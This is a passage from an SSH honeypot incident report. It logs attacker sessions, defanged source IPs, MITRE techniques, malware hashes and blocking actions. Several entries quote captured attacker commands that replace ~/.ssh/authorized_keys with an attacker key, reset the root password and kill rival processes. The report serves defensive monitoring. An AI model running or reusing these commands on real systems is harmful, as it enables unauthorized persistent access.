| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:08:52` | `cowrie.session.connect` |
| `2026-05-28 18:08:52` | `cowrie.client.version` |
| `2026-05-28 18:08:52` | `cowrie.client.kex` |
| `2026-05-28 18:08:53` | `cowrie.login.success` |
| `2026-05-28 18:08:53` | `cowrie.session.params` |
| `2026-05-28 18:08:53` | `cowrie.command.input` |
| `2026-05-28 18:08:53` | `cowrie.command.failed` |
| `2026-05-28 18:08:53` | `cowrie.log.closed` |
| `2026-05-28 18:08:53` | `cowrie.session.params` |
| `2026-05-28 18:08:53` | `cowrie.command.input` |
| `2026-05-28 18:08:53` | `cowrie.session.file_download` |
| `2026-05-28 18:08:53` | `cowrie.log.closed` |
| `2026-05-28 18:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef313e9f6ae

| Field | Detail |
|---|---|
| **Source IP** | `101.36.111[.]119` |
| **First Seen** | 2026-05-28 18:08 |
| **Last Seen** | 2026-05-28 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 18:08:55` | `cowrie.session.connect` |
| `2026-05-28 18:08:55` | `cowrie.client.version` |
| `2026-05-28 18:08:55` | `cowrie.client.kex` |
| `2026-05-28 18:08:56` | `cowrie.login.success` |
| `2026-05-28 18:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.111[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.36.111[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd8d83b3043

| Field | Detail |
|---|---|
| **Source IP** | `120.48.178[.]142` |
| **First Seen** | 2026-05-28 19:01 |
| **Last Seen** | 2026-05-28 19:02 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:JoXvOxJPqpnc"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 19:01:36` | `cowrie.session.connect` |
| `2026-05-28 19:01:36` | `cowrie.client.version` |
| `2026-05-28 19:01:36` | `cowrie.client.kex` |
| `2026-05-28 19:01:37` | `cowrie.login.success` |
| `2026-05-28 19:01:37` | `cowrie.session.params` |
| `2026-05-28 19:01:37` | `cowrie.command.input` |
| `2026-05-28 19:01:37` | `cowrie.command.failed` |
| `2026-05-28 19:01:38` | `cowrie.log.closed` |
| `2026-05-28 19:01:40` | `cowrie.session.params` |
| `2026-05-28 19:01:40` | `cowrie.command.input` |
| `2026-05-28 19:01:40` | `cowrie.session.file_download` |
| `2026-05-28 19:01:40` | `cowrie.log.closed` |
| `2026-05-28 19:01:56` | `cowrie.session.params` |
| `2026-05-28 19:01:56` | `cowrie.command.input` |
| `2026-05-28 19:01:56` | `cowrie.log.closed` |
| `2026-05-28 19:01:57` | `cowrie.session.params` |
| `2026-05-28 19:01:57` | `cowrie.command.input` |
| `2026-05-28 19:01:58` | `cowrie.log.closed` |
| `2026-05-28 19:01:58` | `cowrie.session.params` |
| `2026-05-28 19:01:58` | `cowrie.command.input` |
| `2026-05-28 19:01:59` | `cowrie.session.file_download` |
| `2026-05-28 19:01:59` | `cowrie.log.closed` |
| `2026-05-28 19:01:59` | `cowrie.session.params` |
| `2026-05-28 19:01:59` | `cowrie.command.input` |
| `2026-05-28 19:01:59` | `cowrie.log.closed` |
| `2026-05-28 19:02:01` | `cowrie.session.params` |
| `2026-05-28 19:02:01` | `cowrie.command.input` |
| `2026-05-28 19:02:01` | `cowrie.log.closed` |
| `2026-05-28 19:02:01` | `cowrie.session.params` |
| `2026-05-28 19:02:01` | `cowrie.command.input` |
| `2026-05-28 19:02:01` | `cowrie.command.input` |
| `2026-05-28 19:02:02` | `cowrie.log.closed` |
| `2026-05-28 19:02:03` | `cowrie.session.params` |
| `2026-05-28 19:02:03` | `cowrie.command.input` |
| `2026-05-28 19:02:06` | `cowrie.log.closed` |
| `2026-05-28 19:02:06` | `cowrie.session.params` |
| `2026-05-28 19:02:06` | `cowrie.command.input` |
| `2026-05-28 19:02:07` | `cowrie.log.closed` |
| `2026-05-28 19:02:08` | `cowrie.session.params` |
| `2026-05-28 19:02:08` | `cowrie.command.input` |
| `2026-05-28 19:02:12` | `cowrie.log.closed` |
| `2026-05-28 19:02:14` | `cowrie.session.params` |
| `2026-05-28 19:02:14` | `cowrie.command.input` |
| `2026-05-28 19:02:14` | `cowrie.log.closed` |
| `2026-05-28 19:02:14` | `cowrie.session.params` |
| `2026-05-28 19:02:14` | `cowrie.command.input` |
| `2026-05-28 19:02:15` | `cowrie.log.closed` |
| `2026-05-28 19:02:17` | `cowrie.session.params` |
| `2026-05-28 19:02:17` | `cowrie.command.input` |
| `2026-05-28 19:02:17` | `cowrie.log.closed` |
| `2026-05-28 19:02:18` | `cowrie.session.params` |
| `2026-05-28 19:02:18` | `cowrie.command.input` |
| `2026-05-28 19:02:18` | `cowrie.log.closed` |
| `2026-05-28 19:02:19` | `cowrie.session.params` |
| `2026-05-28 19:02:19` | `cowrie.command.input` |
| `2026-05-28 19:02:19` | `cowrie.log.closed` |
| `2026-05-28 19:02:20` | `cowrie.session.params` |
| `2026-05-28 19:02:20` | `cowrie.command.input` |
| `2026-05-28 19:02:21` | `cowrie.log.closed` |
| `2026-05-28 19:02:22` | `cowrie.session.params` |
| `2026-05-28 19:02:22` | `cowrie.command.input` |
| `2026-05-28 19:02:23` | `cowrie.log.closed` |
| `2026-05-28 19:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.178[.]142` to AbuseIPDB if not already reported
- [ ] Block `120.48.178[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a45542b64a2

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-05-28 19:10 |
| **Last Seen** | 2026-05-28 19:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 19:10:12` | `cowrie.session.connect` |
| `2026-05-28 19:10:12` | `cowrie.client.version` |
| `2026-05-28 19:10:12` | `cowrie.client.kex` |
| `2026-05-28 19:10:13` | `cowrie.login.success` |
| `2026-05-28 19:10:14` | `cowrie.session.params` |
| `2026-05-28 19:10:14` | `cowrie.command.input` |
| `2026-05-28 19:10:14` | `cowrie.command.failed` |
| `2026-05-28 19:10:14` | `cowrie.log.closed` |
| `2026-05-28 19:10:14` | `cowrie.session.params` |
| `2026-05-28 19:10:14` | `cowrie.command.input` |
| `2026-05-28 19:10:15` | `cowrie.session.file_download` |
| `2026-05-28 19:10:15` | `cowrie.log.closed` |
| `2026-05-28 19:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bead2abea6c

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-05-28 19:10 |
| **Last Seen** | 2026-05-28 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 19:10:17` | `cowrie.session.connect` |
| `2026-05-28 19:10:17` | `cowrie.client.version` |
| `2026-05-28 19:10:18` | `cowrie.client.kex` |
| `2026-05-28 19:10:19` | `cowrie.login.success` |
| `2026-05-28 19:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2234aef7d664

| Field | Detail |
|---|---|
| **Source IP** | `156.146.55[.]228` |
| **First Seen** | 2026-05-28 19:11 |
| **Last Seen** | 2026-05-28 19:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 19:11:49` | `cowrie.session.connect` |
| `2026-05-28 19:11:49` | `cowrie.client.version` |
| `2026-05-28 19:11:50` | `cowrie.client.kex` |
| `2026-05-28 19:11:50` | `cowrie.login.success` |
| `2026-05-28 19:11:51` | `cowrie.session.params` |
| `2026-05-28 19:11:51` | `cowrie.command.input` |
| `2026-05-28 19:11:51` | `cowrie.command.failed` |
| `2026-05-28 19:11:51` | `cowrie.log.closed` |
| `2026-05-28 19:11:52` | `cowrie.session.params` |
| `2026-05-28 19:11:52` | `cowrie.command.input` |
| `2026-05-28 19:11:52` | `cowrie.session.file_download` |
| `2026-05-28 19:11:52` | `cowrie.log.closed` |
| `2026-05-28 19:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.146.55[.]228` to AbuseIPDB if not already reported
- [ ] Block `156.146.55[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04380deb0f92

| Field | Detail |
|---|---|
| **Source IP** | `156.146.55[.]228` |
| **First Seen** | 2026-05-28 19:11 |
| **Last Seen** | 2026-05-28 19:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 19:11:55` | `cowrie.session.connect` |
| `2026-05-28 19:11:55` | `cowrie.client.version` |
| `2026-05-28 19:11:55` | `cowrie.client.kex` |
| `2026-05-28 19:11:56` | `cowrie.login.success` |
| `2026-05-28 19:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.146.55[.]228` to AbuseIPDB if not already reported
- [ ] Block `156.146.55[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c33bbb6fb5

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-05-28 20:02 |
| **Last Seen** | 2026-05-28 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 20:02:12` | `cowrie.session.connect` |
| `2026-05-28 20:02:12` | `cowrie.client.version` |
| `2026-05-28 20:02:12` | `cowrie.client.kex` |
| `2026-05-28 20:02:12` | `cowrie.login.success` |
| `2026-05-28 20:02:12` | `cowrie.session.params` |
| `2026-05-28 20:02:12` | `cowrie.command.input` |
| `2026-05-28 20:02:12` | `cowrie.command.failed` |
| `2026-05-28 20:02:12` | `cowrie.log.closed` |
| `2026-05-28 20:02:13` | `cowrie.session.params` |
| `2026-05-28 20:02:13` | `cowrie.command.input` |
| `2026-05-28 20:02:13` | `cowrie.session.file_download` |
| `2026-05-28 20:02:13` | `cowrie.log.closed` |
| `2026-05-28 20:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6d8143d46a

| Field | Detail |
|---|---|
| **Source IP** | `103.89.136[.]111` |
| **First Seen** | 2026-05-28 20:02 |
| **Last Seen** | 2026-05-28 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 20:02:14` | `cowrie.session.connect` |
| `2026-05-28 20:02:14` | `cowrie.client.version` |
| `2026-05-28 20:02:14` | `cowrie.client.kex` |
| `2026-05-28 20:02:14` | `cowrie.login.success` |
| `2026-05-28 20:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.89.136[.]111` to AbuseIPDB if not already reported
- [ ] Block `103.89.136[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.68.20[.]220` | **199** | 2026-05-28 18:33 | 2026-05-28 20:27 | 176m | 0 | `T1592` | 🟠 MEDIUM |
| `112.78.1[.]125` | **135** | 2026-05-28 17:37 | 2026-05-28 20:27 | 65m | 0 | `T1592` | 🟠 MEDIUM |
| `103.242.104[.]81` | **59** | 2026-05-28 17:35 | 2026-05-28 20:25 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.38[.]122` | **25** | 2026-05-28 18:10 | 2026-05-28 18:15 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `101.36.111[.]119` | **16** | 2026-05-28 17:48 | 2026-05-28 18:15 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.189.25[.]100` | **5** | 2026-05-28 17:47 | 2026-05-28 20:10 | 3m | 0 | `T1592` | 🟢 LOW |
| `120.48.178[.]142` | **2** | 2026-05-28 19:01 | 2026-05-28 19:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]139` | **2** | 2026-05-28 19:18 | 2026-05-28 19:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]97` | **2** | 2026-05-28 20:12 | 2026-05-28 20:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]144` | 1 | 2026-05-28 17:46 | 2026-05-28 17:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-05-28 17:45 | 2026-05-28 17:45 | 5s | 0 | `T1592` | 🟢 LOW |
| `103.89.136[.]111` | 1 | 2026-05-28 20:02 | 2026-05-28 20:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.33[.]21` | 1 | 2026-05-28 19:05 | 2026-05-28 19:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-05-28 19:55 | 2026-05-28 19:56 | 32s | 0 | `T1592` | 🟢 LOW |
| `149.255.39[.]70` | 1 | 2026-05-28 17:57 | 2026-05-28 17:58 | 63s | 0 | `T1592` | 🟢 LOW |
| `156.146.55[.]228` | 1 | 2026-05-28 19:11 | 2026-05-28 19:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.94.135[.]138` | 1 | 2026-05-28 19:13 | 2026-05-28 19:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.140.214[.]21` | 1 | 2026-05-28 18:18 | 2026-05-28 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `41.242.115[.]84` | 1 | 2026-05-28 19:10 | 2026-05-28 19:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `69.5.169[.]28` | 1 | 2026-05-28 18:18 | 2026-05-28 18:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.179.72[.]28` | 1 | 2026-05-28 19:24 | 2026-05-28 19:24 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.68.20[.]220` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `149.255.39[.]70` | US | Hivelocity LLC | **100** ⚠️ | 2 |
| `112.78.1[.]125` | VN | ODS Joint Stock Company | **100** ⚠️ | 2 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `103.242.104[.]81` | ID | PT Lintas Jaringan Nusantara | **100** ⚠️ | 5 |
| `156.146.55[.]228` | BG | Datacamp Limited | **100** ⚠️ | 40 |
| `223.123.38[.]122` | PK | CMPak Limited | **100** ⚠️ | 5 |
| `103.203.57[.]19` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `66.132.172[.]97` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `69.5.169[.]28` | DE | Infrawatch Limited | **100** ⚠️ | 9 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)
